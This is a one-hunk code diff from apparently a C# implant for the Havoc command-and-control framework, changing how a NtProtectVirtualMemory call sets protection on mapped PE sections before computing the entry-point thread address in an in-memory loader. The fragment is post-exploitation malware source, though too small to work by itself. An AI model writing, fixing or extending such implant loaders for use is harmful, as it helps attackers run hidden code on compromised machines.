@@ -356,7 +356,7 @@ namespace HavocImplant.AgentFunctions
 
                 Console.WriteLine($"Protecting {new string(imageSectionHeaders[i].Name)}");
                 IntPtr sectionSize = (IntPtr)imageSectionHeaders[i].SizeOfRawData;
-                NtProtectVirtualMemory((IntPtr)(-1), ref sectionLocation, ref sectionSize, memProtectionConstant, out uint unused2);
+                NtProtectVirtualMemory((IntPtr)(-1), sectionLocation, ref sectionSize, memProtectionConstant, out uint unused2);
             }
             
             IntPtr threadStartAddress = IntPtr.Add(peBase, (int)optionalHeader.AddressOfEntryPoint);
